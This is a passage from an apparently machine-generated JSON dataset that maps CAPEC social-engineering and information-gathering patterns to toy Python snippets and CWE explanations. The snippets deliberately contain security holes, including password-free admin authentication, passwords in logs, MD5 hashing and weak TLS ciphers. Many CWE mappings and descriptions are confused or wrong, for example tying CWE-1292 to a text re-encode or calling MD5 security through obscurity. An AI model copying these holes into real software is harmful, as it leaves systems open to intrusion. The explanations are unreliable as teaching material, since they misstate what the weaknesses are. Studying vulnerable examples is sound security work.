        "code_snippet": "import os\nimport logging\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to simulate data storage without proper protection\ndef store_data(data, filename):\n    try:\n        with open(filename, 'w') as file:\n            file.write(data)\n        logging.info(f'Data stored in {filename}')\n    except Exception as e:\n        logging.error(f'Error storing data: {e}')\n\n# Function to simulate authentication bypass\ndef authenticate(user, password):\n    # Insecure authentication check\n    if user == 'admin':\n        return True\n    return False\n\n# Simulate storing sensitive data\nsensitive_data = 'Sensitive Information'\nstore_data(sensitive_data, 'data.txt')\n\n# Simulate an authentication attempt\nuser_authenticated = authenticate('admin', 'password')\nif user_authenticated:\n    logging.info('User authenticated successfully')\nelse:\n    logging.warning('Authentication failed')",
        "description": "This Python code snippet demonstrates several deprecated security weaknesses related to the CAPEC 'Social Information Gathering Attacks'. The code includes:\n\n1. **Failure to Protect Stored Data from Modification (CWE-766, CWE-767)**: The `store_data` function writes data to a file without any encryption or integrity checks, making it vulnerable to unauthorized modifications.\n\n2. **Authentication Bypass Issues (CWE-287)**: The `authenticate` function performs an insecure check that allows any user with the username 'admin' to bypass authentication, regardless of the password.\n\n3. **Information Exposure Through Server Log Files (CWE-532)**: The logging configuration writes potentially sensitive information to a log file, which could be accessed by unauthorized users.\n\nThe code represents the main idea of the deprecated CAPEC by showcasing how improper handling of data storage, authentication, and logging can lead to security vulnerabilities."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import socket\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-532: Information Exposure Through Server Log Files\n# CWE-287: Authentication Bypass Issues\n\n# Configure logging\nlogging.basicConfig(filename='server.log', level=logging.INFO)\n\n# Function to check if a domain is trusted\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com', 'secure.org']\n    try:\n        ip = socket.gethostbyname(domain)\n        logging.info(f'Domain {domain} resolved to IP {ip}')\n        return domain in trusted_domains\n    except socket.error as e:\n        logging.error(f'Error resolving domain {domain}: {e}')\n        return False\n\n# Example usage\nuser_domain = 'example.com'\nif is_trusted_domain(user_domain):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a flawed security decision based on DNS lookups (CWE-350) and logs sensitive information (CWE-532). The function `is_trusted_domain` checks if a given domain is in a list of trusted domains by resolving its IP address. The result of the DNS lookup and any errors are logged to a file, potentially exposing sensitive information. Additionally, the code does not properly authenticate users, leading to potential authentication bypass issues (CWE-287). This snippet embodies the deprecated CAPEC pattern of gathering social information through research, as it relies on DNS lookups and logging, which can be exploited by attackers to gather information and bypass security measures."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\n\n# Simulate sensitive information\nsensitive_info = 'User: admin, Password: secret123'\n\n# Store sensitive information in a file (CWE-316)\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate improper scrubbing of sensitive data (CWE-1266)\ndef decommission_device():\n    os.remove('sensitive_info.txt')\n    # Improper scrubbing: data might still be recoverable\n    # No secure deletion or overwriting of the file\n\ndecommission_device()\n\n# Simulate exposure of core dump file (CWE-528)\ndef generate_core_dump():\n    with open('core_dump.txt', 'w') as core_file:\n        core_file.write('Core dump data with sensitive info')\n\n# Simulate exposure of version-control repository (CWE-527)\ndef expose_vcs():\n    os.system('git init exposed_repo')\n    os.system('echo \"Sensitive data\" > exposed_repo/sensitive_file.txt')\n    os.system('cd exposed_repo && git add . && git commit -m \"Initial commit\"')\n\n# Simulate cleartext transmission of sensitive information (CWE-319)\ndef transmit_sensitive_info():\n    import socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('localhost', 12345))\n    s.sendall(b'User: admin, Password: secret123')\n    s.close()\n\n# Call functions to simulate vulnerabilities\ngenerate_core_dump()\nexpose_vcs()\ntransmit_sensitive_info()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' attack. The code includes: (1) Storing sensitive information in cleartext in a file (CWE-316), (2) Improper scrubbing of sensitive data when decommissioning a device (CWE-1266), (3) Generating a core dump file that may contain sensitive information (CWE-528), (4) Exposing a version-control repository with sensitive data (CWE-527), and (5) Transmitting sensitive information in cleartext over a network (CWE-319). These vulnerabilities can lead to sensitive information being accessible to unauthorized actors, which aligns with the concept of dumpster diving where attackers search for discarded information."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\nclass PretextingAttack:\n    def __init__(self, target_url, session_id):\n        self.target_url = target_url\n        self.session_id = session_id\n\n    def perform_attack(self):\n        # CWE-300: Channel Accessible by Non-Endpoint\n        headers = {'Authorization': f'Session {self.session_id}'}\n        response = requests.get(self.target_url, headers=headers)\n        if response.status_code == 200:\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            sensitive_info = response.text\n            print(f'Exposed Sensitive Information: {sensitive_info}')\n        else:\n            print('Failed to retrieve information')\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# Simulating a fake login page to capture session ID\nfake_login_page = \"\"\"\n<html>\n<body>\n<form action=\"/login\" method=\"post\">\n  Username: <input type=\"text\" name=\"username\"><br>\n  Password: <input type=\"password\" name=\"password\"><br>\n  <input type=\"submit\" value=\"Login\">\n</form>\n</body>\n</html>\n\"\"\"\n\n# CWE-1229: Creation of Emergent Resource\n# Creating a fake session ID for demonstration purposes\nfake_session_id = 'fake-session-id-12345'\n\n# Perform the pretexting attack\nattack = PretextingAttack('http://example.com/sensitive-info', fake_session_id)\nattack.perform_attack()",
        "description": "This Python code snippet demonstrates a pretexting attack where an adversary uses a fake session ID to access sensitive information from a target URL. The code includes several CWE-related vulnerabilities: CWE-300 (Channel Accessible by Non-Endpoint) by using a session ID in the headers without proper verification, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by printing the sensitive information retrieved, CWE-451 (User Interface Misrepresentation of Critical Information) by simulating a fake login page to capture session IDs, and CWE-1229 (Creation of Emergent Resource) by creating a fake session ID. The code represents the main idea of pretexting by showing how an attacker can manipulate a scenario to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulated sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.debug(f'User password is: {user_password}')\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\nimport socket\n\ntry:\n    ip_address = socket.gethostbyname('example.com')\n    if ip_address == '192.168.1.1':\n        print('Access granted')\n    else:\n        print('Access denied')\nexcept socket.error as err:\n    print(f'DNS lookup failed: {err}')",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to information exposure and reliance on DNS lookups in security decisions. The code sets up logging to a file (CWE-532) and logs sensitive information such as a user password in debug mode (CWE-534). Additionally, it performs a DNS lookup and makes a security decision based on the IP address (CWE-350). This example highlights the risks of exposing sensitive information through logs and making security decisions based on potentially unreliable DNS information."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350)\ntrusted_domains = ['example.com']\nuser_domain = 'malicious.com'\n\nif user_domain in trusted_domains:\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')\n\n# Simulate failure to protect stored data from modification (CWE-766)\nwith open('data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Simulate failure to provide confidentiality for stored data (CWE-493)\nwith open('data.txt', 'r') as file:\n    print(file.read())",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to information exposure and improper handling of sensitive data. The code logs sensitive information to a debug log file (CWE-532), makes a security decision based on a DNS lookup (CWE-350), and stores sensitive data in a file without encryption or protection against modification (CWE-766 and CWE-493). The main idea is to highlight poor practices in handling and protecting sensitive information, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024).decode('utf-8')\n    print(f\"Received request: {request}\")\n\n    # CWE-205: Observable Behavioral Discrepancy\n    if 'SECRET' in request:\n        response = \"Sensitive Information: The secret code is 1234\"\n    else:\n        response = \"Hello, how can I help you?\"\n\n    client_socket.send(response.encode('utf-8'))\n    client_socket.close()\n\n# CWE-940: Improper Verification of Source of a Communication Channel\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 9999))\nserver_socket.listen(5)\nprint(\"Server listening on port 9999\")\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f\"Accepted connection from {addr}\")\n    handle_client(client_socket)\n",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and handles client requests. The code embodies the main idea of CAPEC-118: Information Elicitation, by showing how an adversary might extract sensitive information through social engineering. The server does not properly verify the source of the communication channel (CWE-940), leading to potential exposure of sensitive information to unauthorized actors (CWE-200). Additionally, the server's behavior changes based on the content of the request (CWE-205), which can be observed by an attacker to infer the presence of sensitive information."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import logging\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# Log sensitive information (vulnerable practice)\nlogging.debug(f'User password: {user_password}')\n\n# Simulate an authentication check\ndef authenticate(user_input):\n    if user_input == user_password:\n        return 'Access Granted'\n    else:\n        return 'Access Denied'\n\n# Example usage\nprint(authenticate('wrong_password'))\nprint(authenticate('SuperSecretPassword123'))",
        "description": "This Python code snippet demonstrates a vulnerable practice related to the deprecated CAPEC-407 (Social Information Gathering via Pretexting) and the related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code configures logging to write to a file and logs sensitive information, such as a user's password. This practice can lead to information exposure if the log files are accessed by unauthorized individuals. Additionally, the code includes a simple authentication function that checks the user input against the logged password, illustrating how sensitive information can be mishandled and exposed."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\nclass CustomerService:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n\n    def handle_request(self, client_socket):\n        try:\n            client_socket.send(b'Welcome to Customer Service. Please provide your credit card number for verification: ')\n            credit_card_number = client_socket.recv(1024).decode('utf-8')\n            print(f'Received credit card number: {credit_card_number}')\n        except Exception as e:\n            print(f'Error handling request: {e}')\n        finally:\n            client_socket.close()\n\n    def start_server(self):\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.bind((self.server_ip, self.server_port))\n        server_socket.listen(5)\n        print('Customer Service server started...')\n        while True:\n            client_socket, addr = server_socket.accept()\n            print(f'Connection from {addr}')\n            self.handle_request(client_socket)\n\nif __name__ == '__main__':\n    server = CustomerService('127.0.0.1', 65432)\n    server.start_server()",
        "description": "This Python code snippet represents a simple server that mimics a customer service representative. The server listens for incoming connections and prompts the client to provide their credit card number for verification. This embodies the CAPEC 'Pretexting via Customer Service' by simulating a scenario where an adversary pretends to be a customer service agent to solicit sensitive information. The code demonstrates several related CWEs: \n- CWE-940: The server does not verify the source of the incoming connection.\n- CWE-300: The server does not verify the identity of the client.\n- CWE-200: The server exposes sensitive information (credit card number) to an unauthorized actor.\n- CWE-408: The server performs an expensive operation (handling credit card information) before proper authentication.\n- CWE-925: Although not directly applicable, the concept of improper verification of intent is represented by the lack of verification of the client's intent."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-1263: Improper Physical Access Control\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\ndef handle_tech_support_request(user_input):\n    # Simulate a tech support request handling\n    if 'password' in user_input.lower():\n        # CWE-200: Exposing sensitive information\n        print('Your password is: 12345')\n\n    # CWE-434: Allowing dangerous file upload\n    if 'upload' in user_input.lower():\n        file_path = '/tmp/uploaded_file.txt'\n        with open(file_path, 'w') as f:\n            f.write('This is a dangerous file.')\n        print(f'File uploaded to {file_path}')\n\n    # CWE-538: Inserting sensitive information into an externally accessible file\n    sensitive_info = 'User: admin, Password: 12345'\n    with open('/tmp/public_info.txt', 'w') as f:\n        f.write(sensitive_info)\n    print('Sensitive information written to /tmp/public_info.txt')\n\n# Simulate a tech support interaction\nuser_input = 'I forgot my password, can you help me?'\nhandle_tech_support_request(user_input)\n\nuser_input = 'I need to upload a file for diagnostics'\nhandle_tech_support_request(user_input)",
        "description": "This Python code snippet simulates a tech support interaction where an adversary can exploit various vulnerabilities. The function `handle_tech_support_request` processes user input and demonstrates several weaknesses: exposing sensitive information (CWE-200), allowing dangerous file uploads (CWE-434), and inserting sensitive information into an externally accessible file (CWE-538). The code represents the main idea of the CAPEC by showing how an adversary posing as tech support can manipulate users into revealing sensitive information or performing actions that compromise security."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport shutil\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-433: Unparsed Raw Web Content Delivery\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef impersonate_delivery_person(target_directory, sensitive_file):\n    # CWE-941: Incorrectly specified destination\n    incorrect_destination = '/tmp/' + os.path.basename(sensitive_file)\n    \n    # CWE-538: Insertion of sensitive information into externally-accessible directory\n    shutil.copy(sensitive_file, incorrect_destination)\n    \n    # CWE-300: Channel accessible by non-endpoint\n    if not os.path.exists(target_directory):\n        os.makedirs(target_directory)\n    \n    # CWE-433: Unparsed raw web content delivery\n    with open(incorrect_destination, 'r') as file:\n        raw_content = file.read()\n    \n    # CWE-1292: Incorrect conversion of security identifiers\n    try:\n        converted_content = raw_content.encode('utf-8').decode('latin-1')\n    except UnicodeDecodeError:\n        converted_content = raw_content\n    \n    # Simulate delivery person pretexting by placing the file in the target directory\n    with open(os.path.join(target_directory, 'delivered_file.txt'), 'w') as file:\n        file.write(converted_content)\n\n# Example usage\nimpersonate_delivery_person('/var/www/html', '/path/to/sensitive_info.txt')",
        "description": "This Python code snippet simulates the CAPEC 'Pretexting via Delivery Person' by impersonating a delivery person to place a sensitive file in a target directory. The code demonstrates several related CWEs:\n\n1. CWE-941: The destination for the sensitive file is incorrectly specified, leading to potential misplacement.\n2. CWE-538: Sensitive information is copied to an externally-accessible directory.\n3. CWE-300: The code does not verify the identity of actors accessing the target directory, making it accessible by non-endpoints.\n4. CWE-433: Raw content is read and potentially delivered without proper parsing.\n5. CWE-1292: Incorrect conversion of security identifiers is simulated by attempting to encode and decode the file content.\n\nThe function 'impersonate_delivery_person' takes a target directory and a sensitive file as inputs, and places the sensitive file in the target directory, simulating the behavior of a delivery person pretexting attack."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import random\n\nclass PhoneSystem:\n    def __init__(self):\n        self.employees = {'Alice': '1234', 'Bob': '5678'}\n        self.help_desk = '9999'\n\n    def verify_identity(self, caller_id):\n        # CWE-300: Channel Accessible by Non-Endpoint\n        if caller_id not in self.employees.values() and caller_id != self.help_desk:\n            return False\n        return True\n\n    def handle_call(self, caller_id, request):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        if not self.verify_identity(caller_id):\n            print('Caller identity could not be verified.')\n            return\n\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if request == 'get_employee_info':\n            print('Sensitive information exposed: Employee list')\n            print(self.employees)\n        else:\n            print('Request not recognized.')\n\n# Simulate a pretexting attack\nphone_system = PhoneSystem()\n# Adversary uses a spoofed caller ID to impersonate help desk\nspoofed_caller_id = '9999'\nphone_system.handle_call(spoofed_caller_id, 'get_employee_info')",
        "description": "This Python code snippet simulates a phone system that handles incoming calls and verifies caller identities. The `PhoneSystem` class contains a list of employees and a help desk number. The `verify_identity` method checks if the caller ID is from a known employee or the help desk. The `handle_call` method processes the call and exposes sensitive information if the caller ID is verified. The code demonstrates a pretexting attack where an adversary uses a spoofed caller ID to impersonate the help desk and request sensitive employee information. This example highlights vulnerabilities such as improper verification of the source of a communication channel (CWE-940) and exposure of sensitive information to an unauthorized actor (CWE-200)."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\n\nclass HelpDesk:\n    def __init__(self):\n        self.sensitive_info = 'User: John Doe, Password: secret123'\n        self.request_count = 0\n\n    def handle_request(self, user, request):\n        self.request_count += 1\n        if self.request_count > 5:\n            print('Too many requests. Please try again later.')\n            return\n        if user == 'supervisor':\n            print(f'Providing sensitive information: {self.sensitive_info}')\n        else:\n            print('Request handled.')\n\nhelp_desk = HelpDesk()\n\n# Simulating social engineering attack\nfor i in range(7):\n    if i < 5:\n        help_desk.handle_request('employee', 'request')\n    else:\n        help_desk.handle_request('supervisor', 'request')\n    time.sleep(1)",
        "description": "This Python code snippet simulates a help desk system that can be manipulated through social engineering. The HelpDesk class contains sensitive information and a method to handle requests. The handle_request method checks the number of requests and limits them to prevent abuse (CWE-799). If the user is identified as a 'supervisor', the system exposes sensitive information (CWE-200). The code demonstrates how an attacker might exploit human behavior by pretending to be a supervisor to gain unauthorized access to sensitive information. The request count mechanism also highlights the importance of controlling interaction frequency to prevent abuse."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-656: Reliance on Security Through Obscurity\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n# CWE-301: Reflection Attack in an Authentication Protocol\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to simulate login\ndef login(username, password):\n    # CWE-654: Single factor authentication\n    if username in users and users[username] == hashlib.md5(password.encode()).hexdigest():\n        print(\"Login successful!\")\n    else:\n        print(\"Login failed!\")\n\n# Function to simulate a social engineering attack\ndef social_engineering_attack():\n    # CWE-656: Security through obscurity\n    print(\"Attempting to exploit user's perception...\")\n    # CWE-205: Observable behavioral discrepancy\n    print(\"Observing system behavior for discrepancies...\")\n    # CWE-222: Truncation of security-relevant information\n    print(\"Truncating security logs to obscure attack traces...\")\n    # CWE-301: Reflection attack\n    print(\"Using reflection attack to impersonate user...\")\n    login('user1', 'password')  # Using known password for demonstration\n\n# Simulate the attack\nsocial_engineering_attack()",
        "description": "This Python code snippet demonstrates a simulated social engineering attack that exploits the target's perception to gain unauthorized access. The `login` function represents a vulnerable authentication mechanism relying on a single factor (CWE-654) and using MD5 hashing, which is considered weak and relies on security through obscurity (CWE-656). The `social_engineering_attack` function simulates an adversary's actions to exploit these weaknesses, including observing system behavior for discrepancies (CWE-205), truncating security logs to hide traces (CWE-222), and performing a reflection attack to impersonate a user (CWE-301). The code highlights how an adversary can manipulate the target's perception and exploit multiple weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-222: Truncation of Security-relevant Information\n\ndef create_socket_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {str(e)[:10]}\")  # CWE-222: Truncation of Security-relevant Information\n        return None\n\n# Simulate a social engineering attack\n# CAPEC: Influence Perception of Reciprocation\n\ndef social_engineering_attack(target_host, target_port):\n    s = create_socket_connection(target_host, target_port)\n    if s:\n        # CWE-940: No verification of the source\n        s.send(b\"Hello, you are doing a great job! Can you tell me your username?\")\n        response = s.recv(1024)\n        print(f\"Received: {response.decode('utf-8')}\")\n        s.close()\n\n# Example usage\nsocial_engineering_attack('example.com', 80)",
        "description": "This Python code snippet demonstrates a basic example of a social engineering attack that leverages the CAPEC concept of 'Influence Perception of Reciprocation'. The code attempts to create a socket connection to a target host and port (CWE-940 and CWE-941). If the connection is successful, it sends a message designed to elicit a response by complimenting the target and asking for sensitive information (CAPEC). The code also includes a CWE-222 vulnerability by truncating the error message if the connection fails. This example highlights how improper verification of communication channels and social engineering techniques can be used to extract sensitive information."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow for weak ciphers\ncontext = ssl.create_default_context()\ncontext.set_ciphers('ALL:!DH:!aNULL')  # Allow weak ciphers\n\n# Connect to the server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request\nwrapped_socket.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n\n# Receive a response\nresponse = wrapped_socket.recv(4096)\nprint(response.decode('utf-8'))\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable SSL/TLS connection setup where weak ciphers are allowed during the negotiation process. This embodies the main idea of the deprecated CAPEC 'Target Influence via Perception of Concession' by showing how an attacker could influence the security of a connection by forcing the use of less secure algorithms (CWE-757). The code also touches on CWE-941 by potentially connecting to an incorrect destination if the hostname resolution is tampered with. The observable discrepancies (CWE-203 and CWE-205) could be exploited by an attacker to infer the state of the connection or the success of the operation."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\n\nclass ScarcityInfluence:\n    def __init__(self):\n        self.resources = {'item1': 10, 'item2': 5}\n        self.access_log = []\n\n    def check_availability(self, item):\n        if item in self.resources and self.resources[item] > 0:\n            return True\n        return False\n\n    def create_urgency(self, item):\n        if self.check_availability(item):\n            print(f\"Hurry! Only {self.resources[item]} {item}(s) left!\")\n            return True\n        else:\n            print(f\"Sorry, {item} is out of stock.\")\n            return False\n\n    def access_resource(self, user, item):\n        if self.create_urgency(item):\n            self.resources[item] -= 1\n            self.access_log.append((user, item, time.time()))\n            print(f\"{user} accessed {item}. Remaining: {self.resources[item]}\")\n        else:\n            print(f\"{user} could not access {item}. Out of stock.\")\n\n# Example usage\nscarcity = ScarcityInfluence()\nscarcity.access_resource('User1', 'item1')\nscarcity.access_resource('User2', 'item1')\nscarcity.access_resource('User3', 'item2')\nscarcity.access_resource('User4', 'item2')\nscarcity.access_resource('User5', 'item2')\nscarcity.access_resource('User6', 'item2')",
        "description": "This Python code snippet demonstrates the concept of 'Influence Perception of Scarcity' by creating a class that manages a limited set of resources. The `create_urgency` method checks the availability of an item and prints a message to create a sense of urgency if the item is available in limited quantity. The `access_resource` method allows users to access the resource, reducing its quantity and logging the access. This snippet also touches on related CWEs: it relies on a single factor (resource count) for decision-making (CWE-654), and it could be exploited to consume resources asymmetrically (CWE-405). The urgency message could be considered a form of security through obscurity (CWE-656) as it manipulates user behavior based on perceived scarcity."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef impersonate_authority(target_ip, target_port):\n    # Create a socket connection to the target\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # Send a message impersonating an authority figure\n    authority_message = 'AUTH: Admin; Please provide your credentials.'\n    s.send(authority_message.encode())\n\n    # Receive response from the target\n    response = s.recv(1024).decode()\n    print(f'Received response: {response}')\n\n    # CWE-222: Truncation of Security-relevant Information\n    # Truncate the response to hide the full details\n    truncated_response = response[:50]\n    print(f'Truncated response: {truncated_response}')\n\n    s.close()\n\n# Example usage\nimpersonate_authority('192.168.1.10', 8080)",
        "description": "This Python code snippet demonstrates a simple example of an adversary using social engineering to impersonate an authority figure and extract sensitive information from a target. The code creates a socket connection to the target and sends a message pretending to be an admin, asking for credentials. This embodies the CAPEC 'Influence Perception of Authority' by leveraging CWE-301 (Reflection Attack), CWE-300 (Channel Accessible by Non-Endpoint), CWE-940 (Improper Verification of Source), CWE-654 (Reliance on a Single Factor), and CWE-222 (Truncation of Security-relevant Information). The response from the target is then truncated to obscure the full details, demonstrating how security-relevant information can be mishandled."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineer:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.session = requests.Session()\n\n    def send_request(self, path, data=None):\n        url = f'{self.target_url}/{path}'\n        response = self.session.post(url, data=data)\n        return response\n\n    def influence_target(self):\n        # Step 1: Send a minor request\n        self.send_request('minor_task', data={'task': 'small'})\n        # Step 2: Send a slightly larger request\n        self.send_request('medium_task', data={'task': 'medium'})\n        # Step 3: Send a major request\n        self.send_request('major_task', data={'task': 'large'})\n\n# Example usage\nse = SocialEngineer('http://example.com')\nse.influence_target()",
        "description": "This Python code snippet demonstrates a simplified version of the 'Influence Perception of Commitment and Consistency' attack pattern. The SocialEngineer class simulates an adversary who sends a series of HTTP POST requests to a target URL, starting with a minor task and gradually increasing the request size. This approach leverages the psychological principle that individuals are more likely to comply with larger requests after agreeing to smaller ones. The code also touches on related CWEs: it does not limit the frequency of interactions (CWE-799), and it does not verify the source of the communication channel (CWE-940). Additionally, the observable discrepancies in responses (CWE-203) could be exploited to infer the success of each request."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import hashlib\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.users = {'trusted_user': '5f4dcc3b5aa765d61d8327deb882cf99'}  # md5 for 'password'\n        self.session_tokens = {}\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            token = self.generate_token(username)\n            self.session_tokens[username] = token\n            return token\n        return None\n\n    def generate_token(self, username):\n        return hashlib.md5(username.encode()).hexdigest()\n\n    def access_resource(self, token):\n        for user, user_token in self.session_tokens.items():\n            if user_token == token:\n                return f\"Access granted to {user}\"\n        return \"Access denied\"\n\n# Adversary builds a relationship and gets the token\nadversary = AuthenticationSystem()\ntrusted_user_token = adversary.authenticate('trusted_user', 'password')\n\n# Adversary uses the token to access resources\nprint(adversary.access_resource(trusted_user_token))",
        "description": "This Python code snippet demonstrates an authentication system that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The system uses a simple username-password authentication mechanism and generates session tokens based on MD5 hashes. The adversary can exploit the system by building a relationship with a trusted user and obtaining their session token. The code highlights the following vulnerabilities:\n\n1. **Reflection Attack in an Authentication Protocol (CWE-301)**: The adversary can use the target machine to impersonate a trusted user by obtaining their session token.\n2. **Reliance on a Single Factor in a Security Decision (CWE-654)**: The system relies solely on the session token for access control, making it vulnerable if the token is compromised.\n3. **Reliance on Security Through Obscurity (CWE-656)**: The system's security depends on the obscurity of the token generation mechanism, which is based on MD5 hashes.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can influence the target's actions (in this case, obtaining the session token) to gain unauthorized access to resources."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass VotingSystem:\n    def __init__(self):\n        self.votes = {'A': 0, 'B': 0}\n        self.user_votes = {}\n\n    def vote(self, user, choice):\n        if user in self.user_votes:\n            print(\"User has already voted.\")\n            return\n        if choice not in self.votes:\n            print(\"Invalid choice.\")\n            return\n        self.user_votes[user] = choice\n        self.votes[choice] += 1\n        self.display_votes()\n\n    def display_votes(self):\n        # Simulate observable discrepancy by showing manipulated results\n        manipulated_votes = {k: v + random.randint(0, 2) for k, v in self.votes.items()}\n        print(f\"Current votes: {manipulated_votes}\")\n\n# Example usage\nvoting_system = VotingSystem()\nvoting_system.vote('user1', 'A')\nvoting_system.vote('user2', 'B')\nvoting_system.vote('user3', 'A')\nvoting_system.vote('user1', 'B')  # User already voted\nvoting_system.vote('user4', 'C')  # Invalid choice",
        "description": "This Python code snippet represents a simple voting system where users can vote for choices 'A' or 'B'. The system keeps track of user votes to prevent multiple votes from the same user. The 'display_votes' method introduces an observable discrepancy by manipulating the vote counts before displaying them. This manipulation simulates the influence of perception of consensus or social proof, as users may be influenced by the displayed (manipulated) vote counts. The code also demonstrates reliance on a single factor (user identity) for vote validation, which is a security weakness (CWE-654). Additionally, the observable discrepancies in vote counts can reveal security-relevant information (CWE-203, CWE-205)."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
